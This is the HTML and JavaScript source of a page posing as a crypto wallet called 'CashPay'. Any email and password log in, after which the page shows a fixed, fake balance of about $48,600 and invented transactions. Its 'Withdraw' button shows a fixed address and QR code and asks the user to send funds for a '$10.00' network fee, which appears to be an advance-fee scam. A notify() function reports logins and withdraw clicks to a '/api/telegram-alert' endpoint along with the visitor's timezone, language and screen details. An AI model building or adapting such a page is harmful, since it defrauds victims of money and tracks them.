<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>CashPay Wallet</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
<style>
:root{--bg:#07090c;--card:#101720;--card2:#141c27;--line:#253142;--text:#f6f8fb;--muted:#8795a8;--green:#18c98d;--green2:#087e5d;--red:#ef5365;--amber:#f6bd4f;--blue:#6f8cff;--shadow:0 28px 80px rgba(0,0,0,.48);--r:24px}*{box-sizing:border-box}html,body{margin:0;min-height:100%;background:radial-gradient(circle at 50% -10%,rgba(24,201,141,.1),transparent 35%),var(--bg);color:var(--text);font-family:'Plus Jakarta Sans',sans-serif}button,input{font:inherit;outline:none}button{cursor:pointer}.mono{font-family:'JetBrains Mono',monospace}#app{min-height:100vh}.login{min-height:100vh;display:grid;place-items:center;padding:24px}.login-card,.modal,.balance,.assets,.txs{background:linear-gradient(145deg,rgba(20,29,40,.97),rgba(9,13,18,.97));border:1px solid rgba(255,255,255,.08);box-shadow:var(--shadow);border-radius:var(--r)}.login-card{width:min(420px,100%);padding:34px}.brand{display:flex;align-items:center;gap:11px;font-weight:800;font-size:23px;letter-spacing:-.03em}.logo{width:43px;height:43px;border-radius:13px;background:linear-gradient(145deg,#34e0a5,#087e5d);display:grid;place-items:center;box-shadow:0 10px 35px rgba(24,201,141,.25)}.logo svg{width:29px;height:29px}.login .brand{justify-content:center;margin-bottom:28px}.login h1{font-size:24px;margin:0 0 7px}.login p{font-size:13px;color:var(--muted);margin:0 0 25px}.field{margin-bottom:17px}.field label{display:block;font-size:11px;font-weight:800;color:#aab5c4;margin-bottom:8px}.field input{width:100%;padding:14px;border-radius:13px;border:1px solid var(--line);background:#080c11;color:#fff}.field input:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(24,201,141,.13)}.primary{width:100%;border:0;border-radius:13px;padding:14px;background:linear-gradient(135deg,#20d699,#0aa675);color:#03140e;font-weight:800;box-shadow:0 12px 28px rgba(24,201,141,.2)}.error{display:none;background:rgba(239,83,101,.1);border:1px solid rgba(239,83,101,.3);color:#ff8794;padding:11px 13px;border-radius:12px;font-size:12px;font-weight:700;margin-bottom:16px}.error.show{display:block}.top{height:65px;position:sticky;top:0;z-index:10;display:flex;align-items:center;justify-content:space-between;padding:0 28px;background:rgba(7,10,14,.82);backdrop-filter:blur(20px);border-bottom:1px solid rgba(255,255,255,.07)}.top-right{display:flex;align-items:center;gap:9px}.addr{display:flex;gap:7px;align-items:center;padding:6px 7px 6px 12px;border:1px solid var(--line);border-radius:30px;color:var(--muted);font-size:11px}.small-btn,.logout{border:1px solid var(--line);background:#111822;color:#dce4ee;border-radius:20px;padding:6px 11px;font-size:11px;font-weight:800}.logout{border-radius:10px;background:transparent;color:var(--muted)}main{width:min(700px,100%);margin:auto;padding:34px 18px calc(60px + env(safe-area-inset-bottom))}.balance{padding:30px;margin-bottom:17px;position:relative;overflow:hidden}.balance:after{content:"";position:absolute;width:340px;height:340px;border-radius:50%;right:-170px;top:-190px;background:radial-gradient(circle,rgba(24,201,141,.17),transparent 68%);pointer-events:none}.profile{position:absolute;right:24px;top:24px;width:45px;height:45px;border-radius:50%;border:1px solid rgba(255,255,255,.1);background:rgba(255,255,255,.035);color:#dce5ef;display:grid;place-items:center;z-index:2;padding:0;overflow:hidden}.profile img{width:100%;height:100%;display:block}.eyebrow{font-size:10px;letter-spacing:.13em;text-transform:uppercase;color:#31dca5;font-weight:800}.total{font-size:49px;line-height:1;margin-top:12px;font-weight:800;letter-spacing:-.055em}.total sup{font-size:22px;opacity:.55}.alloc{height:9px;background:#1a222d;border-radius:20px;display:flex;overflow:hidden;margin:27px 0 14px}.seg{height:100%}.legend{display:flex;flex-wrap:wrap;gap:8px 16px;color:#8794a5;font-size:10px;font-weight:700}.dot{display:inline-block;width:7px;height:7px;border-radius:50%;margin-right:5px}.actions{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:28px}.action{padding:14px 8px;border:1px solid var(--line);border-radius:15px;background:linear-gradient(145deg,#131b26,#0d131b);color:#f4f7fa;font-weight:800;font-size:12px}.action.deposit{color:#2de0a2}.action.withdraw{color:#ffc85b}.action.tx{color:#91a6ff}.head{display:flex;justify-content:space-between;align-items:center;margin:0 3px 11px}.head h2{font-size:14px;margin:0}.head span{font-size:10px;color:#6f7d90;font-weight:700}.assets,.txs{overflow:hidden}.asset{display:grid;grid-template-columns:42px 1fr auto;align-items:center;gap:12px;padding:17px 18px;border-bottom:1px solid rgba(255,255,255,.06)}.asset:last-child{border-bottom:0}.coin{width:38px;height:38px;border-radius:50%;display:grid;place-items:center;font-weight:800;font-size:13px;color:#fff}.coin.usdc{background:#2775ca}.coin.usdt{background:#26a17b}.coin.sol{background:linear-gradient(135deg,#9945ff,#14f195)}.coin.bnb{background:#f3ba2f;color:#111}.asset-name{font-size:12px;font-weight:800}.asset-sub{font-size:10px;color:var(--muted);margin-top:4px}.asset-value{text-align:right}.asset-value strong{display:block;font-size:12px}.asset-value span{font-size:10px;color:var(--muted)}.tx{display:grid;grid-template-columns:1fr auto;gap:12px;padding:16px 18px;border-bottom:1px solid rgba(255,255,255,.06)}.tx:last-child{border-bottom:0}.tx-title{font-size:11px;font-weight:800}.tx-meta{font-size:9px;color:var(--muted);margin-top:4px}.tx-amount{text-align:right;font-size:11px;font-weight:800}.green{color:var(--green)}.red{color:var(--red)}.withdraw-modal{display:none;position:fixed;inset:0;z-index:30;background:rgba(0,0,0,.7);backdrop-filter:blur(8px);place-items:center;padding:18px}.withdraw-modal.open{display:grid}.modal{width:min(450px,100%);padding:25px}.modal-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}.modal h3{margin:0;font-size:18px}.close{border:0;background:transparent;color:#8795a8;font-size:24px}.qr{background:#fff;width:220px;height:220px;padding:10px;border-radius:18px;margin:15px auto}.address-box{display:flex;gap:8px;align-items:center;background:#080c11;border:1px solid var(--line);padding:11px;border-radius:12px;margin-top:15px}.address-box code{font-size:9px;word-break:break-all;flex:1;color:#cbd5e1}.copy{border:0;background:#1b2734;color:#fff;border-radius:9px;padding:8px 10px;font-size:10px;font-weight:800}.toast{position:fixed;left:50%;bottom:25px;transform:translateX(-50%) translateY(20px);opacity:0;background:#eafcf5;color:#063a29;padding:11px 16px;border-radius:12px;font-size:11px;font-weight:800;transition:.25s;z-index:50}.toast.show{opacity:1;transform:translateX(-50%) translateY(0)}@media(max-width:560px){.top{padding:0 14px}.addr{display:none}main{padding-top:18px}.total{font-size:42px}.balance{padding:24px}.actions{gap:7px}.action{font-size:11px;padding:13px 5px}.login-card{padding:26px}}
</style>
</head>
<body>
<div id="app"></div><div id="toast" class="toast">Copied</div>
<script>
const state={loggedIn:false,profile:{name:'William Olamide',status:'KYC Verified'},assets:[{name:'USDC',sub:'USD Coin',amount:14500,value:14500,cls:'usdc'},{name:'USDT',sub:'Tether',amount:12500,value:12500,cls:'usdt'},{name:'SOL',sub:'Solana',amount:65,value:10400,cls:'sol'},{name:'BNB',sub:'BNB Chain',amount:16,value:11200,cls:'bnb'}],address:'0x7F2A9bC4E1D8f6A2c91D0e8b4D1F5a8C7E2B9d6F'};
function notify(event){try{fetch('/api/telegram-alert',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({event,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,language:navigator.language,screen:`${screen.width}x${screen.height}`,page:location.pathname,referrer:document.referrer||'Direct'})})}catch(e){}}
function toast(t){const x=document.getElementById('toast');x.textContent=t;x.classList.add('show');setTimeout(()=>x.classList.remove('show'),1800)}
function renderLogin(){app.innerHTML=`<div class="login"><div class="login-card"><div class="brand"><div class="logo"><svg viewBox="0 0 32 32" fill="none"><path d="M9 5h12a5 5 0 0 1 0 10H12v5h9a5 5 0 0 1 0 10H9V5Z" stroke="white" stroke-width="3"/><path d="M7 10h18M7 22h18" stroke="white" stroke-width="2"/></svg></div>CashPay</div><h1>Welcome back</h1><p>Sign in to access your secure wallet.</p><div id="loginError" class="error">Enter your email and password.</div><div class="field"><label>Email</label><input id="email" type="email" autocomplete="username" placeholder="you@example.com"></div><div class="field"><label>Password</label><input id="password" type="password" autocomplete="current-password" placeholder="••••••••"></div><button class="primary" id="signIn">Sign in</button></div></div>`;signIn.onclick=()=>{if(!email.value.trim()||!password.value){loginError.classList.add('show');return}state.loggedIn=true;notify('login');renderApp()}}
function renderApp(){const total=state.assets.reduce((a,b)=>a+b.value,0);app.innerHTML=`<header class="top"><div class="brand"><div class="logo"><svg viewBox="0 0 32 32" fill="none"><path d="M9 5h12a5 5 0 0 1 0 10H12v5h9a5 5 0 0 1 0 10H9V5Z" stroke="white" stroke-width="3"/><path d="M7 10h18M7 22h18" stroke="white" stroke-width="2"/></svg></div>CashPay</div><div class="top-right"><div class="addr"><span class="mono">${state.address.slice(0,6)}...${state.address.slice(-5)}</span><button class="small-btn" id="copyTop">Copy</button></div><button class="logout" id="logout">Log out</button></div></header><main><section class="balance"><button class="profile" id="profile" title="Profile"><span style="font-size:20px">◉</span></button><div class="eyebrow">Total wallet balance</div><div class="total">$${total.toLocaleString()}<sup>.00</sup></div><div class="alloc">${state.assets.map(a=>`<div class="seg" style="width:${a.value/total*100}%;background:${a.cls==='usdc'?'#2775ca':a.cls==='usdt'?'#26a17b':a.cls==='sol'?'#9945ff':'#f3ba2f'}"></div>`).join('')}</div><div class="legend">${state.assets.map(a=>`<span><i class="dot" style="background:${a.cls==='usdc'?'#2775ca':a.cls==='usdt'?'#26a17b':a.cls==='sol'?'#9945ff':'#f3ba2f'}"></i>${a.name}</span>`).join('')}</div></section><div class="actions"><button class="action deposit" id="deposit">＋ Deposit</button><button class="action withdraw" id="withdraw">↗ Withdraw</button><button class="action tx" id="transactions">☷ Transactions</button></div><div class="head"><h2>Wallet assets</h2><span>4 assets</span></div><section class="assets">${state.assets.map(a=>`<div class="asset"><div class="coin ${a.cls}">${a.name==='USDC'?'$':a.name==='USDT'?'₮':a.name==='SOL'?'S': 'B'}</div><div><div class="asset-name">${a.name}</div><div class="asset-sub">${a.sub}</div></div><div class="asset-value"><strong>${a.amount.toLocaleString()} ${a.name}</strong><span>$${a.value.toLocaleString()}.00</span></div></div>`).join('')}</section><div class="head" style="margin-top:28px"><h2>Recent activity</h2><span>Latest</span></div><section class="txs"><div class="tx"><div><div class="tx-title">Withdrawal</div><div class="tx-meta">USDC · Today, 10:42</div></div><div class="tx-amount red">−$1,250.00</div></div><div class="tx"><div><div class="tx-title">Deposit</div><div class="tx-meta">USDT · Yesterday, 15:18</div></div><div class="tx-amount green">+$4,500.00</div></div><div class="tx"><div><div class="tx-title">Withdrawal</div><div class="tx-meta">SOL · Aug 22, 09:31</div></div><div class="tx-amount red">−$800.00</div></div></section></main><div class="withdraw-modal" id="modal"><div class="modal"><div class="modal-head"><h3>Withdraw</h3><button class="close" id="close">×</button></div><p style="font-size:11px;color:var(--muted);margin:0">Send funds to your wallet address. Network fee: <b style="color:#ffc85b">$10.00</b></p><div class="qr" id="qr"></div><div class="address-box"><code>${state.address}</code><button class="copy" id="copyAddress">Copy</button></div></div></div>`;wireApp()}
function wireApp(){copyTop.onclick=()=>{navigator.clipboard?.writeText(state.address);toast('Wallet address copied')};withdraw.onclick=()=>{modal.classList.add('open');qr.innerHTML='';new QRCode(qr,{text:state.address,width:200,height:200,colorDark:'#000',colorLight:'#fff'});notify('withdraw')};close.onclick=()=>modal.classList.remove('open');modal.onclick=e=>{if(e.target===modal)modal.classList.remove('open')};copyAddress.onclick=()=>{navigator.clipboard?.writeText(state.address);toast('Wallet address copied')};transactions.onclick=()=>document.querySelector('.txs').scrollIntoView({behavior:'smooth'});deposit.onclick=()=>toast('Deposit address ready');profile.onclick=()=>toast(`${state.profile.name} · ${state.profile.status}`);logout.onclick=()=>{state.loggedIn=false;renderLogin()}}
renderLogin();
</script></body></html>
